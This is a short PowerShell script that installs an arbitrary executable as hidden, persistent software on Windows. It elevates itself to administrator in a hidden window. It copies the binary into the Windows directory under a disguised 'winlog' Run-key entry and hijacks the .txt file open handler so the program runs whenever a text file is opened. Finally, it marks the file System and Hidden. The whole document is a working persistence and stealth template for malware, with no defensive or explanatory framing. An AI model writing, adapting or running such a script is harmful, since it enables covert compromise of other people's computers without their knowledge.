# NOTE: If text files are associated with something other than notepad, this will override it.
# You will also need to compile file as .exe

# Set the file name as your .exe
$strFileName = "file.exe"

If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell.exe -Verb RunAs -ArgumentList ('-WindowStyle Hidden -noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    exit
}

$strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
Set-Location -Path $strDirScriptPath

$WINDIR = "$env:WINDIR"

# Copy file to windir folder
If (test-path "$WINDIR\$strFileName") {Remove-Item "$WINDIR\$strFileName" -Force}
Copy-Item $strFileName $WINDIR -Force

# make program run at startup
New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winlog -PropertyType String -value $WINDIR\$strFileName -Force

# make program open anytime a user opens a text file
New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$WINDIR\$strFileName %1" -Force

# set attributes to be a system file and a hidden file
$objGetFile=Get-Item $WINDIR\$strFileName; $objGetFile.Attributes = 'System, Hidden'
